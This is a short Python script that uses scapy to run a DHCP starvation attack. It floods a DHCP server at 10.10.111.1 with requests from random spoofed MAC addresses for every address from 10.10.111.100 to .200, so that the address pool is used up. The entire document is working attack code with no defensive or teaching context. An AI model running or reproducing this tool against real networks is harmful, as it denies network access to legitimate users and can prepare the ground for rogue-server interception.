import sys
import os
from scapy.all import *

def main():
    broad = "ff:ff:ff:ff:ff:ff"
    conf.checkIPaddr = False #To stop scapy from checking return packet originating from any packet that we have sent out
    
    subnet = "10.10.111."
    
    def starve():
        for ip in range (100,201):
            for i in range (0,8):
                mac_address = RandMAC()
                dhcp_request = Ether(src=mac_address, dst=broad)/IP(src="0.0.0.0", dst="255.255.255.255")/UDP(sport=68, dport=67)/BOOTP(chaddr=mac_address)/DHCP(options=[("message-type","request"),("server_id","10.10.111.1"),("requested_addr", subnet + str(ip)),"end"])
                sendp(dhcp_request)
                print "Requesting: " + subnet + str(ip) + "\n"
                time.sleep(1)
                
    starve()
            
if __name__=="__main__":
    main()
